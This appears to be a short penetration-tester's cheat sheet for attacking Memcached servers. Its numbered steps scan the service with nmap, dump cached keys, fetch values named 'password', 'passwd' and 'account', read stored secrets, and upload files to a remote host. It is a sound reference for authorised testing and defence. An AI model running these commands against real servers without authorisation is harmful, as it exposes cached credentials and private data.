# Memcached

Port: 11211 UDP

Tools: memcached-cli https://github.com/pd4d10/memcached-cli

Links:

https://www.hackingarticles.in/penetration-testing-on-memcached-server/

### Steps

#### 1) Nmap scan

    sudo nmap RHOST -p 11211 -sU -sS --script memcached-info

#### 2) Install tools

    npm install -g memcached-cli

    sudo apt install libmemcached-tools

#### 3) Authenticate

    memcached-cli USERNAME:PASSWORD@RHOST:11211

#### 4) Print stats of memcached port

    echo -en "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n" | nc -q1 -u 127.0.0.1 11211

#### 5) Memcached commands

    stats items
    stats cachedump 1 0
    get link
    get file
    get user
    get passwd
    get account
    get username
    get password

### Alternate way to dump info from server

    memcdump --servers=RHOST

#### View secrets

    memccat --servers=RHOST fifth fourth third second first

#### Upload a file to the memcached server

    memccp --servers=RHOST file

